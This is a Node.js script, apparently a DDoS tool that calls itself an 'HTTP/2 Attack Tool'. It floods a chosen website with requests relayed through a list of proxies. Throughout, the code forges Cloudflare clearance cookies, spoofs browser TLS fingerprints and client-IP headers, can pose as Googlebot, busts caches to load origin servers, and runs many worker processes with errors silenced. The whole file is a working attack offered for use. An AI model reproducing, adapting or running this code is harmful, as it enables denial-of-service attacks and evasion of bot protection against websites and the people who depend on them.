const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const HPACK = require('hpack');
const os = require("os");
const { exec } = require('child_process');

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\n" + 
                        (options.authHeader || "") + 
                        "Connection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);
        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function get_option(flag) {
    const index = process.argv.indexOf(flag);
    if (index === -1) return undefined;
    if (index + 1 < process.argv.length && !process.argv[index + 1].startsWith('--')) {
        return process.argv[index + 1];
    }
    return 'true';
}

function has_flag(flag) {
    return process.argv.includes(flag);
}

const options = {
    bfm: get_option('--bfm') === 'true',
    cookie: get_option('--cookie') === 'true',
    manualCookie: get_option('--getcookie'),
    cache: get_option('--cache') === 'true',
    autoCookie: get_option('--auto-cookie') === 'true',
    debug: get_option('--debug') === 'true',
    fakebot: get_option('--fakebot') === 'true',
    ratelimit: parseInt(get_option('--ratelimit')) || 0,
    autoratelimit: get_option('--autoratelimit') === 'true',
    referrer: get_option('--Referrer') === 'true',
    userAgent: get_option('--ua'),
    customProxy: get_option('--proxy'),
    auth: has_flag('--auth')
};

if (process.argv.length < 7) {
    console.log(`Usage: <target> <time> <rate> <threads> <proxy-file/null> [options]

Options:
  --bfm true/false            Bypass BFM cookie (default: false)
  --cache true/false          Bypass cache (default: false)
  --debug true/false          Show debug headers (default: false)
  --ratelimit <number>        Max requests per proxy (default: unlimited)
  --autoratelimit true/false  Auto rate limit (default: false)
  --Referrer true/false       Add alternating referrer (default: false)
  --auth                      proxy ip:port:user:pass
  --cookie true/false         Auto fetch cookies
  --auto-cookie true/false    Load cookies from file
`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = [];
if (options.customProxy) {
    proxies = [options.customProxy];
    console.log(`\x1b[36m[INFO]\x1b[0m Using custom proxy: ${options.customProxy}`);
} else if (args.proxyFile && args.proxyFile.toLowerCase() !== 'null') {
    proxies = readLines(args.proxyFile);
} else {
    console.log(`\x1b[31m[ERROR]\x1b[0m No proxy specified.`);
    process.exit(1);
}

const parsedTarget = url.parse(args.target);

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstra(length) {
    const characters = "0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS15169", country: "US", ip: "8.8.4." },
        { asn: "AS15169", country: "US", ip: "74.125.0." },
        { asn: "AS15169", country: "US", ip: "216.58.0." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS8075", country: "US", ip: "13.107.22." },
        { asn: "AS13335", country: "NL", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS13335", country: "NL", ip: "172.64.0." },
        { asn: "AS13335", country: "NL", ip: "188.114.0." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    if (Object.keys(headers).length === 0) headers["cdn-loop"] = `${generateLegitIP()}:${randstra(5)}`;
    return headers;
}

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
];

let lastBrowserWasFirefox = false;
const getRandomBrowser = () => {
    lastBrowserWasFirefox = !lastBrowserWasFirefox;
    return lastBrowserWasFirefox ? "firefox" : "chrome";
};

function generateFakePlugins(browser) {
    const pdfPlugins = [{name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"]}];
    const chromePlugins = [{name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl"]}];
    const firefoxPlugins = [{name: "Widevine Content Decryption Module", description: "Enables Widevine licenses", filename: "libwidevinecdm.so", mimeTypes: ["application/x-ppapi-widevine-cdm"]}];
    
    let plugins = [...pdfPlugins];
    if (browser === 'chrome') plugins = [...plugins, ...chromePlugins];
    else plugins = [...plugins, ...firefoxPlugins];
    
    return { count: plugins.length, list: plugins.map(p => ({ name: p.name, description: p.description, mimeTypes: p.mimeTypes.join(',') })) };
}

function generateJA3Fingerprint(browser) {
    const ja3Strings = {
        chrome: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
        firefox: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0"
    };
    const ja3String = ja3Strings[browser];
    const hash = crypto.createHash('md5').update(ja3String).digest('hex');
    return { ja3: ja3String, ja3_hash: hash };
}

function generateJA4Fingerprint(browserType) {
    const profile = {
        chrome: { quic: 'c13f', alpnList: ['h2', 'http/1.1'], signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'], extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281'] },
        firefox: { quic: 'c13f', alpnList: ['h2', 'http/1.1'], signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'], extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281'] }
    };
    const p = profile[browserType] || profile.chrome;
    const alpnStr = p.alpnList[0].length.toString().padStart(2, '0') + p.alpnList[0];
    const sigAlgStr = p.signatureAlgorithms.slice(0, 2).join('_').substring(0, 4);
    const extHash = p.extensionsOrder.map(e => e.charAt(0)).join('').substring(0, 8);
    const ja4 = `${p.quic}_${alpnStr}_${sigAlgStr}_${extHash}`;
    const hash = crypto.createHash('md5').update(ja4).digest('hex').substring(0, 16);
    return { ja4, ja4_hash: hash };
}

function createRealisticClientHello(browser) {
    const ja3Data = generateJA3Fingerprint(browser);
    const ja4Data = generateJA4Fingerprint(browser);
    const plugins = generateFakePlugins(browser);
    const tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    const cipherList = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
    const alpnProtocols = ['h2', 'http/1.1'];
    const ecdhCurve = "GREASE:X25519:secp256r1:secp384r1:secp521r1";
    const signatureAlgorithms = browser === 'chrome' ?
        'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384' :
        'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384';
    
    return { tlsVersions, ciphers: cipherList, ecdhCurve, alpnProtocols, ja3: ja3Data, ja4: ja4Data, signatureAlgorithms, plugins };
}

function generateBypassCookie() {
    return `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${Math.floor(Date.now() / 1000)}-1.2.1.1-${randstr(6)}+${randstr(8)}=`;
}

// ============ GENERATE HEADERS DENGAN HEADERS DARI OPERA ============
function generateHeaders(browser, parsedTarget) {
    const userAgents = {
        chrome: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36`,
        firefox: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0`
    };
    
    let ua = userAgents[browser];
    if (options.userAgent) ua = options.userAgent;
    if (options.fakebot) ua = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)";
    
    let cookieHeader = '';
    if (options.bfm) cookieHeader = generateBypassCookie();
    
    const cacheQuery = options.cache ? `?${randstr(8)}=${randstr(8)}` : '';
    
    // Referer options
    const refererOptions = [
        'https://www.google.com/',
        'https://www.bing.com/',
        'https://www.yahoo.com/',
        `https://${parsedTarget.host}/`
    ];
    
    const headers = {
        // HTTP/2 pseudo headers
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":scheme": "https",
        ":path": (parsedTarget.path || '/') + cacheQuery,
        
        // Headers dari request Opera (yang kamu kirim)
        "Host": parsedTarget.host,
        "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": ua,
        "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Accept-Encoding": "gzip, deflate, br",
        "Priority": "u=0, i",
        "Connection": "keep-alive",
        
        // Header tambahan untuk bypass
        ...(cookieHeader ? {"Cookie": cookieHeader} : {}),
        ...generateAlternativeIPHeaders(),
        
        // Cache bypass headers
        ...(options.cache ? {
            "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
            "X-Cache-Buster": randstr(10)
        } : {}),
        
        // TE header
        "TE": "trailers",
        
        // Referer (jika dienable)
        ...(options.referrer ? { "Referer": refererOptions[Math.floor(Math.random() * refererOptions.length)] } : {})
    };
    
    return headers;
}
// ================================================================

const cplist = [
    "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256"
];
const ciphers = cplist[Math.floor(Math.random() * cplist.length)];
const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'rsa_pss_rsae_sha256', 'rsa_pkcs1_sha256'].join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521";
const secureOptions = crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1;
const secureContext = tls.createSecureContext({ ciphers: ciphers, sigalgs: sigalgs, honorCipherOrder: true, secureOptions: secureOptions });

function parseProxy(proxyString) {
    let auth = null;
    let host = null;
    let port = null;

    if (options.auth) {
        const parts = proxyString.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
        if (parts.length >= 4) auth = parts[2] + ':' + parts.slice(3).join(':');
    } else if (proxyString.includes('@')) {
        const parts = proxyString.split('@');
        auth = parts[0];
        const hostPort = parts[1].split(':');
        host = hostPort[0];
        port = parseInt(hostPort[1]);
    } else {
        const parts = proxyString.split(':');
        host = parts[0];
        port = parseInt(parts[1]);
    }

    return {
        auth: auth,
        host: host,
        port: port,
        authHeader: auth ? 'Proxy-Authorization: Basic ' + Buffer.from(auth).toString('base64') + '\r\n' : ''
    };
}

// Stats
const stats = { errors: 0, statusCodes: {}, totalRequests: 0, startTime: Date.now() };
const proxyStats = {};

function trackProxyRequest(proxyIP) {
    if (!proxyStats[proxyIP]) proxyStats[proxyIP] = { requests: 0, retryAfter: 0 };
    proxyStats[proxyIP].requests++;
}

function isProxyRateLimited(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    if (options.ratelimit) return proxyStats[proxyIP].requests >= options.ratelimit;
    return false;
}

function isProxyInRetryWait(proxyIP) {
    if (!proxyStats[proxyIP]) return false;
    return Date.now() < proxyStats[proxyIP].retryAfter;
}

function setProxyRetryAfter(proxyIP, retryAfterValue) {
    if (!proxyStats[proxyIP]) proxyStats[proxyIP] = { requests: 0, retryAfter: 0 };
    let seconds = parseInt(retryAfterValue) || 5;
    proxyStats[proxyIP].retryAfter = Date.now() + (seconds * 1000);
}

function getNextAvailableProxy() {
    let available = proxies.filter(proxy => {
        const parsed = parseProxy(proxy);
        return !isProxyRateLimited(parsed.host) && !isProxyInRetryWait(parsed.host);
    });
    if (available.length === 0) available = proxies;
    return available[Math.floor(Math.random() * available.length)];
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// Cluster Master
if (cluster.isMaster) {
    console.clear();
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║     DCV1 - HTTP/2 Attack Tool with Opera Headers          ║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log('║ Target: ' + args.target.padEnd(47) + '║');
    console.log('║ Time: ' + args.time + 's | Rate: ' + args.Rate + ' | Threads: ' + args.threads + ''.padEnd(29) + '║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log('║ ProxyFile: ' + (args.proxyFile || 'none').padEnd(43) + '║');
    console.log('║ Total Proxies: ' + proxies.length.toString().padEnd(40) + '║');
    console.log('╠════════════════════════════════════════════════════════════╣');
    console.log('║ BFM: ' + (options.bfm ? 'Enabled' : 'Disabled').padEnd(47) + '║');
    console.log('║ Cache: ' + (options.cache ? 'Enabled' : 'Disabled').padEnd(47) + '║');
    console.log('║ Referrer: ' + (options.referrer ? 'Enabled' : 'Disabled').padEnd(46) + '║');
    console.log('╚════════════════════════════════════════════════════════════╝');

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        const runtime = Math.round((Date.now() - stats.startTime) / 1000);
        console.log(`\x1b[32m[${runtime}s]\x1b[0m Total: \x1b[33m${stats.totalRequests.toLocaleString()}\x1b[0m | Errors: \x1b[31m${stats.errors}\x1b[0m`);
    }, 3000);

    setTimeout(() => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        console.log("\n\x1b[32m[✓] Attack finished!\x1b[0m");
        process.exit(0);
    }, args.time * 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'request') stats.totalRequests += msg.count;
        if (msg.type === 'error') stats.errors++;
        if (msg.type === 'status_code' && msg.code) {
            stats.statusCodes[msg.code] = (stats.statusCodes[msg.code] || 0) + 1;
        }
    });
} else {
    // Worker
    function runFlooder() {
        const proxyAddr = options.ratelimit ? getNextAvailableProxy() : randomElement(proxies);
        const parsedProxy = parseProxy(proxyAddr);
        const proxyIP = parsedProxy.host;
        
        if (!options.auth && isProxyInRetryWait(proxyIP)) return;
        if (!options.auth) trackProxyRequest(proxyIP);
        
        const browser = getRandomBrowser();
        const headers = generateHeaders(browser, parsedTarget);
        const clientHello = createRealisticClientHello(browser);
        
        const proxyOptions = {
            host: parsedProxy.host,
            port: parsedProxy.port,
            address: parsedTarget.host,
            timeout: 10,
            authHeader: parsedProxy.authHeader
        };
        
        Socker.HTTP(proxyOptions, (connection, error) => {
            if (error) {
                stats.errors++;
                process.send({ type: 'error' });
                return;
            }
            
            connection.setKeepAlive(true, 100000);
            connection.setNoDelay(true);
            
            const tlsOptions = {
                port: "443",
                secure: true,
                ALPNProtocols: clientHello.alpnProtocols,
                ciphers: clientHello.ciphers,
                sigalgs: clientHello.signatureAlgorithms,
                requestCert: true,
                socket: connection,
                ecdhCurve: clientHello.ecdhCurve,
                honorCipherOrder: true,
                host: parsedTarget.host,
                rejectUnauthorized: false,
                secureOptions: secureOptions,
                secureContext: secureContext,
                servername: parsedTarget.host,
                minVersion: clientHello.tlsVersions.min,
                maxVersion: clientHello.tlsVersions.max
            };
            
            const tlsConn = tls.connect("443", parsedTarget.host, tlsOptions);
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 60000);
            
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                createConnection: () => tlsConn,
                settings: { enablePush: false, maxConcurrentStreams: 1000, initialWindowSize: 6291456 }
            });
            
            client.setMaxListeners(0);
            
            client.on("connect", () => {
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {
                        const dynamicHeaders = generateHeaders(browser, parsedTarget);
                        const request = client.request(dynamicHeaders);
                        
                        request.on("response", (headers) => {
                            const statusCode = headers[":status"];
                            stats.statusCodes[statusCode] = (stats.statusCodes[statusCode] || 0) + 1;
                            process.send({ type: 'status_code', code: statusCode });
                            
                            if (statusCode === 429 || statusCode === "429") {
                                const retryAfter = headers["retry-after"] || "5";
                                if (!options.auth) setProxyRetryAfter(proxyIP, retryAfter);
                            }
                            request.close();
                        });
                        
                        request.on("error", () => {
                            process.send({ type: 'error' });
                        });
                        
                        request.end();
                        process.send({ type: 'request', count: 1 });
                    }
                }, 550);
                
                client.on("close", () => {
                    clearInterval(interval);
                    client.destroy();
                    connection.destroy();
                });
            });
            
            client.on("error", () => {
                client.destroy();
                connection.destroy();
                process.send({ type: 'error' });
            });
        });
    }
    
    for (let i = 0; i < 10; i++) {
        setInterval(runFlooder, 1);
    }
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});